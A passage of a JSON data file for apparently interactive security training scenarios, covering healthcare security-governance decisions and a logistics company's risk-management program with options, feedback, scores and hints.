            "learning_note": "Governance metrics should measure process effectiveness, outcomes, and maturity - providing insight that enables good decisions, not just data.",
            "consequences": {
              "immediate": "Board receives meaningful, actionable metrics",
              "security_impact": "Governance issues visible and addressed",
              "business_impact": "Security program value demonstrated; informed resource decisions"
            }
          },
          {
            "id": "d",
            "text": "Benchmark comparison: how we compare to industry peers on security spending and capabilities",
            "feedback": "Benchmarking provides useful context but doesn't measure whether your governance is working. Being 'average' compared to peers doesn't mean your governance is effective. Benchmarks also have methodology issues and may not compare similar organizations.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Benchmarking is one input to governance decisions but shouldn't be the primary measure of governance effectiveness.",
            "consequences": {
              "immediate": "Comparative data without governance insight",
              "security_impact": "False confidence or concern based on peer comparison",
              "business_impact": "May drive investment to match peers rather than address actual risks"
            }
          }
        ],
        "hints": [
          "What does the Board actually need to know to provide effective oversight?",
          "Think about leading indicators (process health) versus lagging indicators (incidents)"
        ]
      },
      {
        "id": "dp9",
        "sequence": 9,
        "title": "Policy Enforcement Challenge",
        "situation": "Your Data Classification Policy has been in effect for three months. Internal audit reports concerning findings:\n\n- 40% of sampled documents on network shares lack classification labels\n- PHI found in 15 unapproved locations including personal cloud storage\n- Several physicians storing patient lists on personal devices for 'convenience'\n- Research data shared externally without required Data Use Agreements\n\nThe CMO is concerned that strict enforcement will impact clinical operations. The CISO wants demonstrated compliance. How do you address this enforcement gap?",
        "options": [
          {
            "id": "a",
            "text": "Immediate strict enforcement with disciplinary action for all violations",
            "feedback": "Jumping to punishment without addressing root causes creates fear but not compliance. The high violation rate suggests systemic issues - unclear guidance, lack of tools, or impractical requirements - not individual bad actors. Mass discipline damages relationships and doesn't solve underlying problems.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "High violation rates typically indicate systemic issues requiring systemic solutions. Enforcement alone doesn't fix broken processes.",
            "consequences": {
              "immediate": "Staff fear and resentment; workarounds go underground",
              "security_impact": "Compliance appears to improve but shadow IT increases",
              "business_impact": "Clinical staff alienation; potential patient care impact"
            }
          },
          {
            "id": "b",
            "text": "Revise the policy to accommodate current practices since clearly the requirements are unrealistic",
            "feedback": "Weakening policy to match current behavior surrenders to non-compliance. The practices discovered (PHI in cloud storage, untracked external sharing) represent genuine risks that shouldn't be legitimized. Policy should set appropriate standards; implementation should make compliance achievable.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Policies should reflect security requirements, not current convenience. Implementation challenges require implementation solutions, not policy weakening.",
            "consequences": {
              "immediate": "Violations decrease because requirements lowered",
              "security_impact": "Risky practices continue with policy blessing",
              "business_impact": "HIPAA compliance jeopardized; audit findings likely"
            }
          },
          {
            "id": "c",
            "text": "Root cause analysis, remediation plan addressing barriers, grace period with support, then progressive enforcement",
            "feedback": "Excellent approach. Understanding why violations occur reveals systemic fixes. Maybe classification tools are lacking, approved alternatives aren't convenient, or training was insufficient. Address barriers, provide support during a grace period, then enforce progressively. This achieves sustainable compliance.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Sustainable compliance requires addressing root causes (tools, training, processes) before enforcement. Progressive enforcement (warning \u00e2\u2020\u2019 retraining \u00e2\u2020\u2019 escalation \u00e2\u2020\u2019 discipline) demonstrates fairness.",
            "consequences": {
              "immediate": "Violations decrease as barriers removed",
              "security_impact": "Genuine compliance improvement with sustainable practices",
              "business_impact": "Clinical workflow integration; partnership with clinical leadership"
            }
          },
          {
            "id": "d",
            "text": "Technical controls to force compliance - automated classification, DLP blocking, MDM enforcement",
            "feedback": "Technical controls are valuable but can't solve this problem alone. Forcing classification without training creates garbage labels. Blocking without alternatives disrupts work. Technical controls support policy compliance but don't replace understanding and legitimate workflows.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Technical controls are enablers of policy compliance, not substitutes for proper implementation and user understanding.",
            "consequences": {
              "immediate": "Forced compliance but user frustration",
              "security_impact": "Controls may be circumvented or create false sense of security",
              "business_impact": "Clinical workflow disruption; support burden increases"
            }
          }
        ],
        "hints": [
          "What does a 40% violation rate tell you about the problem?",
          "Consider what conditions would make compliance easy and natural"
        ]
      },
      {
        "id": "dp10",
        "sequence": 10,
        "title": "Governance Program Sustainability",
        "situation": "One year into the program, you've achieved significant progress: unified policies across all facilities, functioning governance committees, trained staff, and improving metrics. The CFO raises a concern during budget planning:\n\n'We've invested heavily in building this governance foundation. Now that it's established, can we reduce ongoing investment? What does sustainable governance look like?'\n\nHow do you structure governance for long-term sustainability?",
        "options": [
          {
            "id": "a",
            "text": "Maintain current investment levels indefinitely; security governance is never 'done'",
            "feedback": "While governance requires ongoing investment, arguing for permanent crisis-level funding without demonstrating efficiency isn't sustainable. After initial build-out, some activities require less effort. A mature program should be more efficient than a building program.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Mature programs should demonstrate efficiency gains. Different lifecycle phases require different resource levels.",
            "consequences": {
              "immediate": "Budget request challenged without efficiency demonstration",
              "security_impact": "Resources may be cut without input",
              "business_impact": "Security seen as cost center without efficiency discipline"
            }
          },
          {
            "id": "b",
            "text": "Transition to maintenance mode with minimal staffing; only respond to issues as they arise",
            "feedback": "Reactive governance is no governance. Policies become stale, risks go unmanaged, and compliance degrades. The work done building the program will erode quickly without ongoing attention. Healthcare regulations and threats evolve constantly, requiring proactive management.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Governance requires ongoing effort. Deferred maintenance creates security debt that's expensive to repay.",
            "consequences": {
              "immediate": "Short-term cost savings",
              "security_impact": "Program degrades; policies become outdated; risks accumulate",
              "business_impact": "Compliance findings return; rebuild costs later exceed maintenance costs now"
            }
          },
          {
            "id": "c",
            "text": "Optimize for ongoing operations: reduced one-time costs, right-sized standing capacity, automation where possible, clear triggers for additional investment",
            "feedback": "Excellent approach. Initial build-out requires different resources than ongoing operations. Automate routine tasks (policy reminders, training tracking, metrics collection). Maintain core capacity for regular governance activities. Define triggers for surge investment (major acquisition, new regulation, significant incident). This demonstrates efficiency while ensuring sustainability.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Sustainable governance balances ongoing operational needs with efficiency. Automation, clear processes, and defined triggers optimize resource use.",
            "consequences": {
              "immediate": "Realistic budget that leadership supports",
              "security_impact": "Governance continues effectively with appropriate resources",
              "business_impact": "Demonstrates security team efficiency and business alignment"
            }
          },
          {
            "id": "d",
            "text": "Outsource governance activities to a managed service provider for cost predictability",
            "feedback": "Governance is a core organizational capability that shouldn't be fully outsourced. External resources can supplement for specific needs (assessments, specialized expertise), but governance decisions, risk acceptance, and policy direction must remain internal. Outsourcing these creates accountability gaps.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Governance is a leadership function. Specialized tasks can be augmented externally, but core governance must remain internal for accountability and organizational fit.",
            "consequences": {
              "immediate": "Predictable cost but reduced internal capability",
              "security_impact": "Governance decisions lack organizational context",
              "business_impact": "Accountability unclear; organizational knowledge lost"
            }
          }
        ],
        "hints": [
          "Think about what ongoing activities are truly needed versus one-time build activities",
          "Consider how to demonstrate efficiency while maintaining capability"
        ]
      }
    ],
    "glossary": {
      "policy": "High-level mandatory statement of management intent, approved by senior leadership",
      "standard": "Specific mandatory requirements implementing policy, measurable and auditable",
      "procedure": "Step-by-step instructions for performing specific tasks",
      "guideline": "Recommended but not mandatory practices providing flexibility",
      "governance_structure": "Organizational framework defining decision-making authority and accountability for security",
      "steering_committee": "Executive body providing strategic direction and policy approval",
      "data_classification": "System for categorizing data by sensitivity and handling requirements",
      "exception_process": "Formal method for requesting, evaluating, and approving policy exceptions",
      "compensating_controls": "Alternative security measures when standard controls cannot be implemented",
      "progressive_enforcement": "Escalating response to policy violations from warning to discipline",
      "policy_lifecycle": "Full process from policy creation through review, update, and retirement",
      "governance_metrics": "Measurements indicating effectiveness of security governance processes"
    },
    "outcomes": {
      "optimal_path_summary": "You established a comprehensive security governance framework at Meridian Healthcare by first creating foundational policy structure, then developing policies through stakeholder engagement and pilot testing. You navigated complex regulatory requirements with documented risk-based decisions, implemented practical exception management, and built sustainable operations. The governance program now provides consistent security direction while accommodating clinical operational needs.",
      "key_achievements": [
        "Unified governance framework across all acquired facilities",
        "Policy hierarchy providing clear direction at appropriate levels",
        "Executive steering committee providing strategic oversight",
        "Stakeholder-engaged policy development with clinical buy-in",
        "Documented approach to conflicting external requirements",
        "Fair and practical exception management process",
        "Effective communication and training strategy",
        "Meaningful metrics demonstrating governance value",
        "Progressive enforcement that addresses root causes",
        "Sustainable operating model for long-term success"
      ],
      "lessons_learned": [
        "Governance framework must precede detailed policies for coherence",
        "Tiered governance structure provides appropriate authority levels",
        "Stakeholder involvement in policy development drives adoption",
        "External requirements require systematic analysis and documented resolution",
        "Classification schemes should match organizational data complexity",
        "Exception management requires consistent criteria and compensating controls",
        "Policy communication requires multiple channels and audience tailoring",
        "Governance metrics should inform decisions, not just report status",
        "Enforcement requires addressing root causes before discipline",
        "Sustainable governance optimizes ongoing operations with clear surge triggers"
      ],
      "connections_to_other_scenarios": [
        "Risk management (D5-SIM-002) - Governance enables risk management framework",
        "Third-party risk (D5-SIM-003) - Policies establish vendor security requirements",
        "Compliance (D5-SIM-004) - Governance provides compliance foundation",
        "IAM (D4-SIM-004) - Access control policies direct IAM implementation",
        "Incident Response (D4-SIM-002) - IR policies define response requirements"
      ]
    },
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D5-SIM-002",
    "title": "Risk Management",
    "domain": 5,
    "type": "SIM",
    "difficulty": "intermediate",
    "time_estimate": "40-50 minutes",
    "role": "Security Risk Manager",
    "organization": {
      "name": "Coastal Logistics Corporation",
      "industry": "Supply Chain and Logistics"
    },
    "introduction": "Coastal Logistics has been lucky - operating for years without major security incidents despite limited risk management. But the competitor's ransomware disaster was a wake-up call. The board wants to know: What are our risks? How bad could it get? What are we doing about it? Marcus Thompson has tasked you with building a formal security risk management program. The board meeting is in 8 weeks, and they expect answers.",
    "learning_objectives": [
      "Explain elements of the risk management process",
      "Summarize elements of effective security governance"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Assessment Methodology Selection",
        "situation": "The board wants to understand security risks before their meeting in 8 weeks. The CFO wants dollar figures for budgeting. The CISO wants to quickly identify the biggest threats. You have limited historical data on security incidents.\n\n**Question:** What risk assessment methodology should you use?",
        "options": [
          {
            "id": "A",
            "text": "Purely quantitative assessment with detailed financial modeling",
            "feedback": "{'short': \"Quantitative requires data you don't have\", 'detailed': 'Pure quantitative assessment requires historical incident data, asset valuations, and statistical models. You have limited data and 8 weeks. Quantitative is valuable but not feasible as the only approach for initial assessment. Start qualitative, add quantitative for top risks.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Qualitative assessment first, then quantitative analysis for top risks",
            "feedback": "{'short': 'Correct! Hybrid approach balances speed with rigor', 'detailed': 'Hybrid approach: qualitative assessment (High/Medium/Low) rapidly identifies and prioritizes risks, then quantitative analysis (ALE, financial modeling) for the top 5-10 risks that need detailed cost-benefit analysis. This meets the timeline while providing CFO with financial data for the biggest risks.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Skip formal assessment - we already know ransomware is the biggest risk",
            "feedback": "{'short': 'Assumptions are not risk management', 'detailed': 'Assuming you know the risks without assessment may miss significant threats. Ransomware may be a top risk, but what about insider threat? IoT vulnerabilities? Third-party risks from acquired companies? Formal assessment prevents blind spots.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Hire consultants to do quantitative assessment",
            "feedback": "{'short': \"Consultants can't fix the data problem in 8 weeks\", 'detailed': \"Consultants bring expertise but still need data. In 8 weeks, even experts can't create reliable quantitative models without historical data. They'd likely recommend the hybrid approach anyway. Build internal capability with external support.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "With limited data and time, what approach balances speed with rigor?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Hybrid: qualitative for rapid prioritization, quantitative for top risks needing financial analysis. Best of both approaches."
          }
        ]
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "Risk Register Scope",
        "situation": "You're building the risk register. Some stakeholders want every possible risk documented (hundreds). Others want only the top 10. The risk register will be shared with the board and used for operational planning.\n\n**Question:** What scope should the risk register have?",
        "options": [
          {
            "id": "A",
            "text": "Document every possible risk for completeness (200+ entries)",
            "feedback": "{'short': 'Too many risks obscures what matters', 'detailed': \"A 200-item risk register becomes unmanageable - can't track, update, or report on effectively. Important risks get lost among minor ones. The board doesn't need 200 risks; they need to understand the significant ones. Focus enables action.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Top 10-15 risks only to keep it manageable",
            "feedback": "{'short': 'May miss important risks outside top tier', 'detailed': 'Limiting to top 10-15 is too restrictive for an enterprise. You might miss risks that are currently medium but trending up, or risks important to specific business units. A tiered approach captures more while focusing attention appropriately.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "All significant risks (30-50) with tiered detail based on severity",
            "feedback": "{'short': 'Correct! Comprehensive but tiered for manageability', 'detailed': 'Balanced approach: capture all significant risks (typically 30-50 for mid-size organization), but tier the detail and attention. High/Critical risks get detailed analysis, treatment plans, frequent review. Lower risks get documented and periodic review. Board sees top tier; operational teams see their relevant risks.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Only risks that have already caused incidents",
            "feedback": "{'short': 'Risk management is proactive, not reactive', 'detailed': \"Waiting for incidents to identify risks defeats the purpose. Risk management should identify potential risks before they materialize. The competitor's ransomware attack should inform your risk register even though it didn't happen to you.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How do you capture significant risks without creating an unmanageable list?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Tiered approach: capture all significant risks, but detail and attention varies by severity. High risks get deep focus; lower risks get periodic review."
          }
        ]
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Risk Appetite Definition",
        "situation": "The board asks 'How much risk should we accept?' Different executives have different views - the CFO is conservative, the Chief Commercial Officer wants to move fast, and the General Counsel is concerned about compliance.\n\n**Question:** How should organizational risk appetite be determined?",
        "options": [
          {
            "id": "A",
            "text": "Security team defines risk appetite based on industry best practices",
            "feedback": "{'short': 'Risk appetite is a business decision, not security decision', 'detailed': \"Risk appetite balances risk against business opportunity - that's a strategic business decision. Security can advise on risk levels and implications, but executives and board must decide how much risk aligns with business strategy. Security doesn't own business strategy.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Board and executives define appetite with security providing risk context",
            "feedback": "{'short': 'Correct! Risk appetite is an executive/board decision with expert input', 'detailed': \"Risk appetite is strategic: board and executives decide based on business objectives, competitive landscape, and organizational capacity. Security provides: what risks exist, what happens if they materialize, and what's required to achieve different risk levels. Executives make informed decisions; security enables them.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Zero risk tolerance - don't accept any security risk",
            "feedback": "{'short': 'Zero risk means zero business', 'detailed': 'Eliminating all risk would mean not using computers, not having customers, not having employees. Some risk is inherent in business operations. The question is how much risk to accept, not whether to accept any. Zero tolerance applies only to specific categories like regulatory compliance.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Match whatever competitors are doing",
            "feedback": "{'short': \"Risk appetite should align with your strategy, not competitors'\", 'detailed': 'Competitors may have different business models, risk capacities, or strategies. Your risk appetite should align with your business objectives and capabilities. Competitor benchmarking is informative but not determinative.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Risk appetite is about balancing risk and business objectives. Who makes strategic business decisions?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Board and executives set risk appetite aligned with strategy. Security provides risk context and implications. Business decides; security advises."
          }
        ]
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "Risk Treatment Selection",
        "situation": "A high risk is identified: legacy warehouse systems have unpatched vulnerabilities but can't be updated without significant downtime. Replacing them would cost $5M. The risk of exploitation could cause $20M in losses.\n\n**Question:** What risk treatment approach is MOST appropriate?",
        "options": [
          {
            "id": "A",
            "text": "Accept the risk - replacement is too expensive",
            "feedback": "{'short': \"Accepting a high risk without mitigation isn't appropriate\", 'detailed': \"Risk acceptance is valid when risk is within appetite or cost of treatment exceeds benefit. But this risk ($20M potential loss) likely exceeds appetite, and there may be mitigation options between 'do nothing' and '$5M replacement.' Explore mitigation before accepting.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Avoid the risk - shut down the legacy systems",
            "feedback": "{'short': \"Avoidance isn't practical for critical business systems\", 'detailed': \"These are warehouse management systems - shutting them down shuts the business. Avoidance means eliminating the activity that creates risk, which isn't feasible for core operations. Other treatment options must be considered.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Mitigate with compensating controls while planning replacement",
            "feedback": "{'short': 'Correct! Mitigate current risk while addressing root cause', 'detailed': 'Balanced treatment: implement compensating controls now (network segmentation, monitoring, restricted access) to reduce risk, while planning phased replacement to eliminate the root cause. This reduces immediate risk without requiring immediate $5M investment, and creates path to full resolution.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Transfer the risk with cyber insurance",
            "feedback": "{'short': \"Insurance alone doesn't reduce the risk\", 'detailed': \"Insurance transfers financial risk but doesn't prevent operational disruption, reputational damage, or customer impact. Insurance also may not cover losses from known, unaddressed vulnerabilities. Transfer can supplement mitigation but shouldn't replace it for high operational risks.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "When full remediation is expensive, what can you do to reduce risk now?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Compensating controls: network segmentation, monitoring, access restrictions reduce risk while replacement is planned. Mitigate now, remediate root cause over time."
          }
        ]
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Impact Assessment",
        "situation": "You're assessing the impact of a potential ransomware attack on warehouse operations. Different stakeholders focus on different impacts - IT focuses on recovery cost, Operations on downtime, Finance on revenue loss.\n\n**Question:** What impacts should be included in the risk assessment?",
        "options": [
          {
            "id": "A",
            "text": "Only direct financial costs (recovery, remediation)",
            "feedback": "{'short': 'Misses operational and reputational impacts', 'detailed': 'Direct costs are just one component. A ransomware attack also causes: operational disruption (revenue loss, SLA penalties), reputational damage (customer trust), regulatory implications (notification costs, potential fines), and competitive harm. Incomplete impact assessment leads to undervaluation of risk.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Comprehensive impact: financial, operational, reputational, regulatory, and strategic",
            "feedback": "{'short': 'Correct! Comprehensive impact assessment captures true risk', 'detailed': 'Complete impact assessment: direct costs (recovery, remediation), operational losses (downtime, revenue, penalties), reputational damage (customer loss, brand impact), regulatory (notifications, fines, audit costs), and strategic (competitive position, future opportunities). Only by understanding full impact can leadership make informed decisions.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Worst-case scenario only",
            "feedback": "{'short': \"Worst-case alone doesn't support decision-making\", 'detailed': \"Worst-case is useful for understanding maximum exposure, but decisions need range of scenarios. What's the most likely impact? What's the worst case? This range helps calibrate response. Only presenting worst-case may cause over-reaction or dismissal as unrealistic.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Whatever IT estimates for system recovery",
            "feedback": "{'short': 'IT recovery is a fraction of total impact', 'detailed': \"IT estimates technical recovery but doesn't capture business impact. A $500K recovery project is minor compared to $15M in operational losses and customer churn. Risk assessment must include business impact, not just technical costs.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "A security incident affects more than just IT systems. What else is impacted?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Comprehensive impact: direct costs, operational losses, reputation, regulatory/compliance, and strategic implications. Full picture enables informed decisions."
          }
        ]
      },
      {
        "id": "decision_6",
        "sequence": 6,
        "title": "Risk Prioritization",
        "situation": "You've identified 40 security risks. Resources are limited - you can only actively treat 10-15 risks this year. Some high-impact risks are low likelihood; some high-likelihood risks have moderate impact.\n\n**Question:** How should risks be prioritized for treatment?",
        "options": [
          {
            "id": "A",
            "text": "Highest impact first, regardless of likelihood",
            "feedback": "{'short': 'Ignores probability of occurrence', 'detailed': 'A catastrophic but extremely unlikely risk might rank above a highly likely moderate risk. But if the moderate risk is almost certain to occur and the catastrophic risk is once-in-a-century, resources should address the likely threat first. Both likelihood and impact matter.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Risk score (likelihood \u00c3\u2014 impact) with business context",
            "feedback": "{'short': 'Correct! Combined score with business alignment', 'detailed': 'Prioritization framework: calculate risk score (likelihood \u00c3\u2014 impact), then consider business context - strategic importance, regulatory requirements, quick wins vs. complex efforts. This balances probability and consequence while ensuring alignment with business priorities. High score + strategic importance = top priority.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Easiest to fix first for quick wins",
            "feedback": "{'short': 'Easy fixes may not address biggest risks', 'detailed': \"Quick wins have value for building momentum, but shouldn't drive prioritization. Easy-to-fix risks may be low priority, while hard-to-fix risks may be critical. Include some quick wins but prioritize based on risk level, not fix difficulty.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Whatever the auditors flagged",
            "feedback": "{'short': 'Audit findings are one input, not the prioritization', 'detailed': \"Audit findings should be in the risk register, but auditors don't see everything and may focus on compliance over business risk. Your risk assessment may identify critical risks auditors didn't examine. Use audit findings as input, not as the prioritization framework.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How do you balance likelihood and impact in prioritization?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Risk score (likelihood \u00c3\u2014 impact) provides mathematical basis, business context (strategy, regulations, feasibility) refines prioritization."
          }
        ]
      },
      {
        "id": "decision_7",
        "sequence": 7,
        "title": "Risk Monitoring",
        "situation": "The risk register is complete and treatments are in progress. The CRO asks how you'll know if risks are changing between quarterly reviews. 'I don't want to be surprised,' he says.\n\n**Question:** How should risks be monitored between formal assessments?",
        "options": [
          {
            "id": "A",
            "text": "Wait for incidents to indicate changing risk",
            "feedback": "{'short': 'Incidents mean monitoring failed', 'detailed': 'Waiting for incidents is reactive, not proactive risk management. By the time an incident occurs, the risk has materialized. Monitoring should detect increasing risk before incidents happen, enabling preventive action.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Key Risk Indicators (KRIs) with defined thresholds and alerting",
            "feedback": "{'short': 'Correct! KRIs provide early warning of increasing risk', 'detailed': 'KRI monitoring: identify leading indicators for each major risk (e.g., unpatched vulnerabilities trending up = exploitation risk increasing), set thresholds that trigger review or action, automate collection where possible, and review regularly. KRIs enable proactive response to rising risk before incidents occur.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Monthly review of entire risk register",
            "feedback": "{'short': 'Monthly review is helpful but not continuous monitoring', 'detailed': 'Monthly review catches changes but monthly is a long time for fast-moving risks. KRIs provide continuous monitoring between reviews. Combine KRI monitoring (continuous) with periodic register reviews (monthly or quarterly) for comprehensive coverage.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Rely on security tools to alert on threats",
            "feedback": "{'short': 'Security tools detect technical threats, not business risk changes', 'detailed': \"Security tools monitor technical indicators but don't track all risk factors. A new competitor entering the market increases strategic risk; a key vendor's financial troubles increase third-party risk - security tools don't see these. KRIs can include technical and business indicators.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What provides early warning that a risk is increasing?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Key Risk Indicators (KRIs): metrics that predict increasing risk. Define indicators for top risks, set thresholds, monitor continuously, alert when thresholds exceeded."
          }
        ]
      },
      {
        "id": "decision_8",
        "sequence": 8,
        "title": "Board Risk Reporting",
        "situation": "The board meeting is approaching. You need to present security risks. The board members are business leaders, not security experts. They have 20 minutes for the security risk update.\n\n**Question:** What should the board risk presentation include?",
        "options": [
          {
            "id": "A",
            "text": "Detailed technical analysis of all 40 risks",
            "feedback": "{'short': \"Too detailed for board and won't fit in 20 minutes\", 'detailed': \"Boards don't need or want technical details on 40 risks. They need to understand: what are the biggest risks, how bad could it get, what are we doing about it, and what decisions are needed. Executive summary of top risks, not technical deep-dive.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Top 5-7 risks with business impact, trend, treatment status, and decisions needed",
            "feedback": "{'short': 'Correct! Focused on what board needs to know and decide', 'detailed': 'Effective board reporting: top 5-7 risks (manageable number), business impact (not technical - translate to dollars and operations), trends (improving or worsening), treatment status (what are we doing), and decisions needed (where board input required). Visual heat map plus executive narrative. Leave details for appendix.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Reassurance that everything is under control",
            "feedback": "{'short': 'Boards need transparency, not false comfort', 'detailed': \"Boards have oversight responsibility - they need accurate risk information to fulfill their fiduciary duty. Minimizing risks or providing false comfort could result in board liability if risks materialize. Be honest about risks and what's being done.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Only risks that need board decisions",
            "feedback": "{'short': 'Board needs visibility into overall posture, not just decision items', 'detailed': 'While decisions should be highlighted, the board also needs general awareness of risk posture for oversight. They should know about high risks even when no immediate decision is needed. Informed oversight requires visibility, not just decision requests.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What does a non-technical board need to fulfill their risk oversight role?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Top risks (not all), business impact (not technical), trends, treatment status, decisions needed. Focus on what board can act on and needs to know."
          }
        ]
      },
      {
        "id": "decision_9",
        "sequence": 9,
        "title": "Risk Acceptance Authority",
        "situation": "A business unit wants to accept a high risk to meet a product launch deadline. They say the business opportunity outweighs the security risk. The risk involves customer data and potential regulatory implications.\n\n**Question:** Who should have authority to accept this high risk?",
        "options": [
          {
            "id": "A",
            "text": "Business unit leader - it's their business decision",
            "feedback": "{'short': \"BU leaders can't accept risks beyond their scope\", 'detailed': \"Business unit leaders can accept risks within their domain, but risks involving customer data and regulatory implications affect the entire organization. A single BU can't accept enterprise-wide risk. Escalation to executive leadership is required.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "CISO - they understand the security implications",
            "feedback": "{'short': 'CISO can advise but risk acceptance is business decision', 'detailed': \"CISO should assess and advise on the risk, but accepting business risk is an executive business decision. CISO doesn't have authority to accept risk on behalf of the business - they provide risk information to enable informed decisions by authorized executives.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Executive leadership or risk committee - high risks need executive acceptance",
            "feedback": "{'short': 'Correct! High enterprise risks require executive authority', 'detailed': 'Risk acceptance authority scales with risk level: low risks accepted at operational level, medium risks by department leaders, high risks by executive leadership or risk committee. Risks affecting customers, regulatory compliance, or enterprise reputation require executive acceptance with documented rationale.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Legal department - they handle regulatory issues",
            "feedback": "{'short': \"Legal advises on implications but doesn't accept business risk\", 'detailed': \"Legal provides guidance on regulatory implications and liability, but doesn't have business authority to accept risk. They should be consulted, and their assessment should inform the executive decision, but the acceptance decision is executive leadership's responsibility.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Who has authority to accept risks that affect the entire enterprise?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Risk acceptance authority matches risk level: high enterprise risks (customer data, regulatory) require executive or risk committee acceptance with documented rationale."
          }
        ]
      },
      {
        "id": "decision_10",
        "sequence": 10,
        "title": "Risk Management Integration",
        "situation": "The risk management program is operational. The CRO wants to ensure risk considerations are embedded in business operations, not just a periodic exercise. 'Risk management should influence decisions, not just document them,' he says.\n\n**Question:** How should risk management be integrated into business operations?",
        "options": [
          {
            "id": "A",
            "text": "Annual risk assessment is sufficient integration",
